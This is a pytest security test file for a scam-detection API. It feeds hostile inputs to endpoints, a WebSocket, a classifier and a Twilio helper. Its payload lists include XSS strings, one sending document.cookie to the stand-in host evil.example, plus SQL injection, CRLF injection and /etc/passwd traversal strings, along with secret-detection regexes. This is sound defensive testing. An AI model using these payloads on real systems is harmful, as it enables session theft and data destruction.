"""
test_security_qa.py – QA security tests for RAKSHA Scam Detection Engine.
Branch: feature/qa-evaluation

Scope: unsafe and hostile input handling across:
  - REST API endpoints  (sessions, segments, simulate, end)
  - WebSocket /ws/call/{session_id}
  - AI classifier (SemanticClassifier.classify_text)
  - Risk engine  (RiskEngine.calculate_risk)
  - Twilio helper utilities

Coverage added here does NOT duplicate what already exists in:
  - test_api_validation.py   (missing fields, type errors, malformed JSON,
                               whitespace-only text, 500-word long text, 404s)
  - test_adversarial_scenarios.py (semantic scam detection, false positives)
  - test_risk_engine.py       (score bounds, determinism, empty matches)
  - test_models.py            (Pydantic validation)
  - test_websocket.py         (ping/pong, normal transcript stream)
"""

import json
import re

import pytest
from fastapi.testclient import TestClient

from ai.classifier import semantic_classifier
from backend.app.models import ManipulationCategory, RiskTier, TacticMatch
from backend.app.risk_engine import RiskEngine
from backend.app.services.twilio_service import get_conference_room_name


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

SESSION_ID = "sec-qa-session"


def _create_session(client: TestClient, session_id: str = SESSION_ID) -> dict:
    """Create a session and assert it succeeds."""
    response = client.post(
        "/api/sessions",
        json={"session_id": session_id, "caller_id": "qa-caller", "callee_id": "qa-callee"},
    )
    assert response.status_code == 201, response.text
    return response.json()


# ---------------------------------------------------------------------------
# 1. True empty string in segment text (distinct from whitespace-only)
#    test_api_validation.py covers whitespace-only ("   "); this adds "".
# ---------------------------------------------------------------------------


class TestEmptyInput:
    def test_truly_empty_string_segment_is_accepted_without_crash(self, client: TestClient):
        """An empty string '' must not cause a 5xx – the endpoint accepts any str."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": ""},
        )
        assert response.status_code in {200, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )

    def test_classifier_empty_string_returns_empty_list(self):
        """Classifier must return [] for empty string, not raise."""
        result = semantic_classifier.classify_text("")
        assert result == []

    def test_classifier_pure_whitespace_variants_return_empty_list(self):
        """Classifier must return [] for all pure-whitespace strings."""
        for ws in ["   ", "\t", "\n", "\r\n", " \t \n "]:
            result = semantic_classifier.classify_text(ws)
            assert result == [], f"Expected [] for {repr(ws)}, got {result}"

    def test_risk_engine_empty_session_id_does_not_crash(self):
        """Risk engine must handle an empty session_id without raising."""
        engine = RiskEngine()
        assessment = engine.calculate_risk(
            session_id="", new_matches=[], previous_assessment=None
        )
        assert assessment is not None
        assert assessment.overall_score == 0.0
        assert assessment.risk_tier == RiskTier.SAFE


# ---------------------------------------------------------------------------
# 2. Very long input – session IDs and text
#    test_api_validation.py covers 500-word repeated segment text.
#    Here we cover very long session IDs and caller/callee IDs.
# ---------------------------------------------------------------------------


class TestVeryLongInput:
    def test_512_char_session_id_does_not_crash(self, client: TestClient):
        """A 512-character session ID must not cause a 5xx."""
        long_id = "x" * 512
        response = client.post(
            "/api/sessions",
            json={"session_id": long_id, "caller_id": "caller"},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )

    def test_2000_char_caller_callee_ids_do_not_crash(self, client: TestClient):
        """Extremely long caller_id / callee_id strings must be handled gracefully."""
        long_str = "A" * 2000
        response = client.post(
            "/api/sessions",
            json={"session_id": "sec-longid", "caller_id": long_str, "callee_id": long_str},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )

    def test_classifier_50k_char_text_does_not_crash(self):
        """Classifier must not raise on a 50 000-character input."""
        long_text = "Hello, I need your help. " * 2000  # ~50 000 chars
        result = semantic_classifier.classify_text(long_text)
        assert isinstance(result, list)

    def test_risk_engine_long_evidence_text_does_not_crash(self):
        """Risk engine must not raise when TacticMatch has a very long evidence_text."""
        engine = RiskEngine()
        long_evidence = ("suspicious phrase " * 300)[:5000]
        match = TacticMatch(
            tactic=ManipulationCategory.URGENCY,
            confidence=0.80,
            evidence_text=long_evidence,
        )
        assessment = engine.calculate_risk(
            session_id="sec-long-evidence",
            new_matches=[match],
            previous_assessment=None,
        )
        assert assessment is not None
        assert 0.0 <= assessment.overall_score <= 100.0


# ---------------------------------------------------------------------------
# 3. Unicode and unusual characters
# ---------------------------------------------------------------------------


UNICODE_PAYLOADS = [
    "🎉 Hello! 🔥💯",                              # Emoji
    "أنا ضابط من الشرطة الوطنية",                   # Arabic (RTL)
    "我是警察，请立即汇款",                              # CJK
    "यह एक धोखाधड़ी है",                             # Devanagari
    "Urgеnt: Аccount vеrification required",        # Cyrillic homoglyphs
    "trans\u200bfer\u200cfunds",                    # Zero-width chars
    "H\u0300e\u0301l\u0302l\u0303o\u0304",          # Combining diacritics
    "\u202eevil text\u202c",                        # Bidirectional override
]


class TestUnicodeAndUnusualCharacters:
    @pytest.mark.parametrize("text", UNICODE_PAYLOADS)
    def test_classifier_unicode_does_not_crash(self, text: str):
        """Classifier must not raise on any Unicode input."""
        result = semantic_classifier.classify_text(text)
        assert isinstance(result, list)
        for match in result:
            assert 0.0 <= match.confidence <= 1.0

    @pytest.mark.parametrize("text", UNICODE_PAYLOADS)
    def test_api_segment_with_unicode_does_not_crash(self, client: TestClient, text: str):
        """API must accept Unicode transcript segments without a 5xx error."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": text},
        )
        assert response.status_code in {200, 422}, (
            f"Unicode text {repr(text[:30])} caused {response.status_code}: {response.text}"
        )

    def test_unicode_session_id_does_not_collide_with_existing(self, client: TestClient):
        """A session created with a Unicode ID must have that exact ID, no collision."""
        exotic_id = "sессión-\u200b测试"  # Cyrillic + ZWS + CJK
        response = client.post(
            "/api/sessions",
            json={"session_id": exotic_id, "caller_id": "caller"},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )
        if response.status_code == 201:
            assert response.json()["session_id"] == exotic_id


# ---------------------------------------------------------------------------
# 4. HTML injection in text fields
# ---------------------------------------------------------------------------


HTML_PAYLOADS = [
    "<b>bold scam</b>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<!-- comment --> legit text",
    "<p style='display:none'>hidden</p>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<a href='javascript:void(0)'>click</a>",
]


class TestHTMLInjection:
    @pytest.mark.parametrize("html", HTML_PAYLOADS)
    def test_html_in_segment_text_does_not_crash(self, client: TestClient, html: str):
        """HTML in transcript text must be stored as-is without causing a 5xx."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": html},
        )
        assert response.status_code in {200, 422}, (
            f"HTML payload {repr(html)} caused {response.status_code}: {response.text}"
        )
        if response.status_code == 200:
            # Text must be stored verbatim – not executed, not stripped
            assert response.json().get("text") == html

    @pytest.mark.parametrize("html", HTML_PAYLOADS)
    def test_classifier_html_does_not_crash(self, html: str):
        """Classifier must not raise on HTML strings."""
        result = semantic_classifier.classify_text(html)
        assert isinstance(result, list)

    def test_html_in_caller_id_does_not_crash(self, client: TestClient):
        """HTML tags in caller_id must not cause a 5xx."""
        response = client.post(
            "/api/sessions",
            json={
                "session_id": "sec-html-callerid",
                "caller_id": "<script>alert('xss')</script>",
            },
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )


# ---------------------------------------------------------------------------
# 5. JavaScript injection strings
# ---------------------------------------------------------------------------


JS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
    "javascript:alert(document.cookie)",
    "';alert(String.fromCharCode(88,83,83))//",
    '"><script>alert(1)</script>',
    "<ScRiPt>alert(1)</ScRiPt>",
    "<body onload=alert('xss')>",
    "data:text/html,<script>alert(1)</script>",
]


class TestJavaScriptInjection:
    @pytest.mark.parametrize("js", JS_PAYLOADS)
    def test_js_in_segment_text_is_handled_safely(self, client: TestClient, js: str):
        """JavaScript strings in transcript text must not cause 5xx or expose internals."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": js},
        )
        assert response.status_code in {200, 422}, (
            f"JS payload caused {response.status_code}: {response.text}"
        )

    @pytest.mark.parametrize("js", JS_PAYLOADS)
    def test_classifier_js_strings_do_not_crash(self, js: str):
        """Classifier must not raise on JavaScript injection strings."""
        result = semantic_classifier.classify_text(js)
        assert isinstance(result, list)

    @pytest.mark.parametrize("js", JS_PAYLOADS)
    def test_js_in_session_id_does_not_crash(self, client: TestClient, js: str):
        """Using a JS string as session_id must not cause a 5xx."""
        response = client.post(
            "/api/sessions",
            json={"session_id": js, "caller_id": "caller"},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )


# ---------------------------------------------------------------------------
# 6. SQL-like injection strings
# ---------------------------------------------------------------------------


SQL_PAYLOADS = [
    "' OR 1=1 --",
    "'; DROP TABLE sessions; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    '1; SELECT * FROM sessions WHERE "1"="1"',
    "' OR 'x'='x",
    "0; INSERT INTO sessions VALUES('hacked')",
    "' AND SLEEP(5) --",
]


class TestSQLInjection:
    @pytest.mark.parametrize("sql", SQL_PAYLOADS)
    def test_sql_in_segment_text_does_not_crash(self, client: TestClient, sql: str):
        """SQL injection strings in transcript text must not cause 5xx."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": sql},
        )
        assert response.status_code in {200, 422}, (
            f"SQL payload caused {response.status_code}: {response.text}"
        )

    @pytest.mark.parametrize("sql", SQL_PAYLOADS)
    def test_sql_in_session_id_does_not_crash(self, client: TestClient, sql: str):
        """SQL strings used as session IDs must not crash the application."""
        response = client.post(
            "/api/sessions",
            json={"session_id": sql, "caller_id": "caller"},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )

    @pytest.mark.parametrize("sql", SQL_PAYLOADS)
    def test_classifier_sql_strings_do_not_crash(self, sql: str):
        """Classifier must not raise on SQL injection strings."""
        result = semantic_classifier.classify_text(sql)
        assert isinstance(result, list)


# ---------------------------------------------------------------------------
# 7. Newline / control-character input
# ---------------------------------------------------------------------------


CONTROL_PAYLOADS = [
    "line1\nline2",
    "line1\r\nline2",
    "tab\there",
    "null\x00byte",
    "bell\x07char",
    "backspace\x08here",
    "escape\x1bseq",
    "del\x7fchar",
    # CRLF injection in text value
    "normal text\r\nX-Injected-Header: value",
    "\n\n\n\n",
]


class TestNewlineAndControlCharacters:
    @pytest.mark.parametrize("text", CONTROL_PAYLOADS)
    def test_control_chars_in_segment_text_do_not_crash(self, client: TestClient, text: str):
        """Control characters in transcript text must not cause 5xx."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": text},
        )
        assert response.status_code in {200, 422}, (
            f"Control char payload caused {response.status_code}: {response.text}"
        )

    @pytest.mark.parametrize("text", CONTROL_PAYLOADS)
    def test_classifier_control_chars_do_not_crash(self, text: str):
        """Classifier must not raise on control characters."""
        result = semantic_classifier.classify_text(text)
        assert isinstance(result, list)

    def test_newline_in_session_id_does_not_cause_5xx(self, client: TestClient):
        """A newline embedded in a session ID must not cause a 5xx response."""
        sid_with_newline = "session\ninjected"
        response = client.post(
            "/api/sessions",
            json={"session_id": sid_with_newline, "caller_id": "qa"},
        )
        assert response.status_code in {201, 422}, (
            f"Unexpected status {response.status_code}: {response.text}"
        )


# ---------------------------------------------------------------------------
# 8. Repeated malicious-looking text
# ---------------------------------------------------------------------------


class TestRepeatedMaliciousText:
    def test_repeated_xss_string_in_segment_does_not_crash(self, client: TestClient):
        """Repeating a JS injection string 200 times must not cause 5xx."""
        _create_session(client)
        repeated_xss = "<script>alert(1)</script>" * 200
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": repeated_xss},
        )
        assert response.status_code in {200, 422}, (
            f"Repeated XSS text caused {response.status_code}: {response.text}"
        )

    def test_repeated_sql_injection_in_text_does_not_crash(self, client: TestClient):
        """Repeating SQL injection strings must not cause 5xx."""
        _create_session(client)
        repeated_sql = ("' OR 1=1 -- ") * 100
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": repeated_sql},
        )
        assert response.status_code in {200, 422}, (
            f"Repeated SQL text caused {response.status_code}: {response.text}"
        )

    def test_repeated_null_bytes_do_not_crash(self, client: TestClient):
        """Null-byte spam must not cause 5xx."""
        _create_session(client)
        null_spam = "\x00" * 500
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": null_spam},
        )
        assert response.status_code in {200, 422}, (
            f"Null-byte spam caused {response.status_code}: {response.text}"
        )

    def test_classifier_repeated_scam_phrase_confidence_stays_bounded(self):
        """Classifier confidence must remain in [0, 1] for aggressively repeated scam text."""
        repeated = ("transfer all your money to a gift card immediately " * 500)[:10000]
        result = semantic_classifier.classify_text(repeated)
        for match in result:
            assert 0.0 <= match.confidence <= 1.0, (
                f"Confidence {match.confidence} out of [0,1] for repeated scam text"
            )

    def test_risk_engine_many_identical_matches_score_stays_bounded(self):
        """100 identical TacticMatch entries must not push the score above 100.0."""
        engine = RiskEngine()
        matches = [
            TacticMatch(
                tactic=ManipulationCategory.FINANCIAL_REDIRECTION,
                confidence=1.0,
                evidence_text="Send all your money to a gift card.",
            )
        ] * 100
        assessment = engine.calculate_risk(
            session_id="sec-repeated",
            new_matches=matches,
            previous_assessment=None,
        )
        assert assessment.overall_score <= 100.0, (
            f"Score exceeded 100: {assessment.overall_score}"
        )


# ---------------------------------------------------------------------------
# 9. Malformed JSON / bad request body
#    test_api_validation.py covers: malformed JSON in segment, list payload,
#    invalid status_filter.  Here we cover: empty body, truncated JSON,
#    deeply nested, null values, numeric session_id, boolean text.
# ---------------------------------------------------------------------------


class TestMalformedRequestData:
    def test_empty_body_to_sessions_returns_error(self, client: TestClient):
        """Completely empty body to POST /api/sessions must return 422 or 400."""
        response = client.post(
            "/api/sessions",
            content=b"",
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code in {400, 422}, (
            f"Empty body caused {response.status_code}: {response.text}"
        )

    def test_partial_json_returns_error(self, client: TestClient):
        """A truncated JSON object must be rejected with 400 or 422."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            content=b'{"speaker": "CALLER", "text":',
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code in {400, 422}, (
            f"Partial JSON caused {response.status_code}: {response.text}"
        )

    def test_deeply_nested_json_extra_field_does_not_crash(self, client: TestClient):
        """A deeply nested value in an extra/unknown field must not cause 5xx."""
        _create_session(client)
        payload = {"speaker": "CALLER", "text": "hello", "extra": {}}
        node = payload["extra"]
        for _ in range(100):
            node["child"] = {}
            node = node["child"]
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json=payload,
        )
        assert response.status_code in {200, 422}, (
            f"Deeply nested JSON caused {response.status_code}: {response.text}"
        )

    def test_null_session_caller_callee_ids_do_not_crash(self, client: TestClient):
        """JSON payload with explicit null values must not cause 5xx."""
        response = client.post(
            "/api/sessions",
            json={"session_id": None, "caller_id": None, "callee_id": None},
        )
        assert response.status_code in {201, 422}, (
            f"Null values caused {response.status_code}: {response.text}"
        )

    def test_numeric_session_id_does_not_crash(self, client: TestClient):
        """A numeric session_id must not cause a 5xx (Pydantic may coerce or reject)."""
        response = client.post(
            "/api/sessions",
            json={"session_id": 12345, "caller_id": "qa"},
        )
        assert response.status_code in {201, 422}, (
            f"Numeric session_id caused {response.status_code}: {response.text}"
        )

    def test_boolean_text_field_returns_422(self, client: TestClient):
        """A boolean value for the 'text' field must be rejected with 422."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": True},
        )
        assert response.status_code == 422, (
            f"Boolean text field unexpectedly accepted: {response.status_code}"
        )


# ---------------------------------------------------------------------------
# 10. Error handling – application must never crash (return 5xx) on bad input
# ---------------------------------------------------------------------------


class TestErrorHandlingNoCrash:
    def test_get_nonexistent_session_returns_404_not_500(self, client: TestClient):
        """GET on a session that never existed must return 404, not 500."""
        response = client.get("/api/sessions/this-session-never-existed-sec-qa")
        assert response.status_code == 404
        assert "detail" in response.json()

    def test_segment_on_nonexistent_session_returns_404_not_500(self, client: TestClient):
        """POST segment to a nonexistent session must return 404, not 500."""
        response = client.post(
            "/api/sessions/ghost-session-sec-qa/segments",
            json={"speaker": "CALLER", "text": "hello"},
        )
        assert response.status_code == 404

    def test_end_nonexistent_session_returns_404_not_500(self, client: TestClient):
        """POST /end on a nonexistent session must return 404, not 500."""
        response = client.post("/api/sessions/ghost-end-sec-qa/end")
        assert response.status_code == 404

    def test_health_endpoint_returns_200_not_5xx(self, client: TestClient):
        """GET /health must always return 200."""
        response = client.get("/health")
        assert response.status_code == 200

    def test_classifier_does_not_raise_on_hostile_inputs(self):
        """Classifier must handle all hostile inputs without raising an exception."""
        hostile_inputs = [
            "",
            "\x00",
            "<script>",
            "' OR 1=1 --",
            "A" * 100_000,
            "\uffff",          # non-character
            "\n\r\t\x07\x08",
        ]
        for text in hostile_inputs:
            try:
                result = semantic_classifier.classify_text(text)
                assert isinstance(result, list)
            except Exception as exc:
                pytest.fail(
                    f"classify_text raised {type(exc).__name__} "
                    f"on {repr(text[:40])}: {exc}"
                )

    def test_risk_engine_does_not_raise_on_edge_case_session_ids(self):
        """RiskEngine must not raise for any edge-case session_id string."""
        engine = RiskEngine()
        for sid in ["", "   ", "null", "\x00", "A" * 1000]:
            try:
                assessment = engine.calculate_risk(
                    session_id=sid, new_matches=[], previous_assessment=None
                )
                assert assessment is not None
            except Exception as exc:
                pytest.fail(
                    f"calculate_risk raised {type(exc).__name__} "
                    f"for session_id {repr(sid)}: {exc}"
                )


# ---------------------------------------------------------------------------
# 11. Responses / errors must not expose secrets or API keys
# ---------------------------------------------------------------------------


class TestNoSecretLeakage:
    """Verify that no response body exposes sensitive configuration values.

    Secret variable names tracked (from .env.example):
      DEEPGRAM_API_KEY, TWILIO_AUTH_TOKEN, TWILIO_ACCOUNT_SID

    Even if these are None in the test environment, error messages must not
    reference their names or contain hex token strings (>= 32 hex chars without
    UUID hyphens) that could represent real credentials.
    """

    SENSITIVE_PATTERNS = [
        r"DEEPGRAM_API_KEY",
        r"TWILIO_AUTH_TOKEN",
        r"TWILIO_ACCOUNT_SID",
        # Matches raw hex tokens (32+ chars) that are NOT UUIDs (UUIDs have hyphens)
        r"(?<![0-9a-f\-])[0-9a-f]{32,}(?![0-9a-f\-])",
    ]

    def _assert_no_secret_leak(self, body: str, context: str = "") -> None:
        for pattern in self.SENSITIVE_PATTERNS:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                matched = m.group(0)
                # Allow UUID-like hex (contains hyphens) - these are session IDs
                if "-" not in matched:
                    pytest.fail(
                        f"Potential secret exposed in {context}: "
                        f"pattern '{pattern}' matched '{matched[:30]}...' in response."
                    )

    def test_health_response_does_not_leak_secrets(self, client: TestClient):
        """GET /health must not expose API keys or auth tokens."""
        response = client.get("/health")
        assert response.status_code == 200
        self._assert_no_secret_leak(response.text, "GET /health")

    def test_404_error_does_not_leak_secrets(self, client: TestClient):
        """404 error responses must not reveal internal config or secrets."""
        response = client.get("/api/sessions/no-such-session-leakcheck")
        assert response.status_code == 404
        self._assert_no_secret_leak(response.text, "GET /sessions/nonexistent 404")

    def test_422_validation_error_does_not_leak_secrets(self, client: TestClient):
        """422 validation error responses must not expose secrets."""
        response = client.post(
            "/api/sessions",
            content=b"not-valid-json",
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code in {400, 422}
        self._assert_no_secret_leak(response.text, "POST /sessions 422")

    def test_segment_error_does_not_leak_secrets(self, client: TestClient):
        """Segment creation errors must not expose secrets."""
        _create_session(client)
        response = client.post(
            f"/api/sessions/{SESSION_ID}/segments",
            json={"speaker": "CALLER", "text": 999},  # invalid type → 422
        )
        assert response.status_code == 422
        self._assert_no_secret_leak(response.text, "POST /segments 422")


# ---------------------------------------------------------------------------
# 12. WebSocket hostile input handling
#     test_websocket.py covers normal ping/pong and a single transcript stream.
#     Here we add: malformed JSON, JSON array, unknown type, JS/SQL text,
#     blank text, very large messages.
# ---------------------------------------------------------------------------


class TestWebSocketHostileInput:
    def test_ws_invalid_json_produces_error_message(self, client: TestClient):
        """Invalid JSON over WebSocket must produce an ERROR message, not disconnect."""
        with client.websocket_connect("/ws/call/ws-sec-qa-1") as ws:
            ws.receive_json()  # discard initial SESSION_STATUS
            ws.send_text("this is not json }{")
            error_msg = ws.receive_json()
            assert error_msg["type"] == "ERROR"
            assert "json" in error_msg["data"].get("error", "").lower()

    def test_ws_json_array_produces_error_message(self, client: TestClient):
        """A JSON array (not an object) must produce an ERROR message."""
        with client.websocket_connect("/ws/call/ws-sec-qa-2") as ws:
            ws.receive_json()
            ws.send_json(["not", "an", "object"])
            error_msg = ws.receive_json()
            assert error_msg["type"] == "ERROR"

    def test_ws_unknown_message_type_produces_error_message(self, client: TestClient):
        """An unknown WS message type must produce an ERROR response."""
        with client.websocket_connect("/ws/call/ws-sec-qa-3") as ws:
            ws.receive_json()
            ws.send_json({"type": "UNKNOWN_MALICIOUS_TYPE", "data": {}})
            error_msg = ws.receive_json()
            assert error_msg["type"] == "ERROR"

    def test_ws_js_injection_in_transcript_text_is_safe(self, client: TestClient):
        """A JS injection string as WS transcript text must not crash the backend."""
        js_payload = "<script>alert(document.cookie)</script>"
        with client.websocket_connect("/ws/call/ws-sec-qa-4") as ws:
            ws.receive_json()
            ws.send_json({
                "type": "TRANSCRIPT_STREAM",
                "data": {"speaker": "CALLER", "text": js_payload, "is_final": True},
            })
            response = ws.receive_json()
            assert response["type"] in {
                "TRANSCRIPT_UPDATE", "TRANSCRIPT_STREAM", "RISK_UPDATE", "ERROR"
            }

    def test_ws_blank_text_produces_error_message(self, client: TestClient):
        """A blank/whitespace-only 'text' in WS TRANSCRIPT_STREAM must receive an ERROR."""
        with client.websocket_connect("/ws/call/ws-sec-qa-5") as ws:
            ws.receive_json()
            ws.send_json({
                "type": "TRANSCRIPT_STREAM",
                "data": {"speaker": "CALLER", "text": "   ", "is_final": True},
            })
            error_msg = ws.receive_json()
            assert error_msg["type"] == "ERROR"
            assert "text" in error_msg["data"].get("error", "").lower()

    def test_ws_sql_injection_in_transcript_text_is_safe(self, client: TestClient):
        """SQL injection string as WS transcript text must not crash the backend."""
        sql_payload = "' OR 1=1 --; DROP TABLE sessions;"
        with client.websocket_connect("/ws/call/ws-sec-qa-6") as ws:
            ws.receive_json()
            ws.send_json({
                "type": "TRANSCRIPT_STREAM",
                "data": {"speaker": "CALLER", "text": sql_payload, "is_final": True},
            })
            response = ws.receive_json()
            assert response["type"] in {
                "TRANSCRIPT_UPDATE", "TRANSCRIPT_STREAM", "RISK_UPDATE", "ERROR"
            }

    def test_ws_very_large_message_does_not_crash(self, client: TestClient):
        """A very large WS message payload must not crash the backend."""
        large_text = "This is a very long transcript utterance. " * 500
        with client.websocket_connect("/ws/call/ws-sec-qa-7") as ws:
            ws.receive_json()
            ws.send_json({
                "type": "TRANSCRIPT_STREAM",
                "data": {"speaker": "CALLER", "text": large_text, "is_final": True},
            })
            response = ws.receive_json()
            assert response["type"] in {
                "TRANSCRIPT_UPDATE", "TRANSCRIPT_STREAM", "RISK_UPDATE", "ERROR"
            }


# ---------------------------------------------------------------------------
# 13. Twilio utility – get_conference_room_name sanitisation
# ---------------------------------------------------------------------------


HOSTILE_SESSION_IDS_FOR_CONF = [
    "session/../../etc/passwd",
    "session\ninjected-header",
    "<script>alert(1)</script>",
    "' OR 1=1 --",
    "session id with spaces",
    "session\x00null",
    "raksha_conf_evil",   # attempts to masquerade as a valid room name
    "A" * 512,
]


class TestTwilioConferenceRoomNameSanitisation:
    @pytest.mark.parametrize("session_id", HOSTILE_SESSION_IDS_FOR_CONF)
    def test_conference_room_name_only_contains_safe_chars(self, session_id: str):
        """get_conference_room_name must produce only [a-zA-Z0-9_-] after the prefix."""
        name = get_conference_room_name(session_id)
        assert name.startswith("raksha_conf_"), f"Missing prefix in: {name}"
        suffix = name[len("raksha_conf_"):]
        unsafe_chars = re.findall(r"[^a-zA-Z0-9_\-]", suffix)
        assert not unsafe_chars, (
            f"Conference name '{name[:80]}' contains unsafe chars: {unsafe_chars}"
        )

    def test_conference_room_name_is_deterministic(self):
        """Same session_id must always produce the same conference room name."""
        sid = "my-stable-session-id"
        assert get_conference_room_name(sid) == get_conference_room_name(sid)
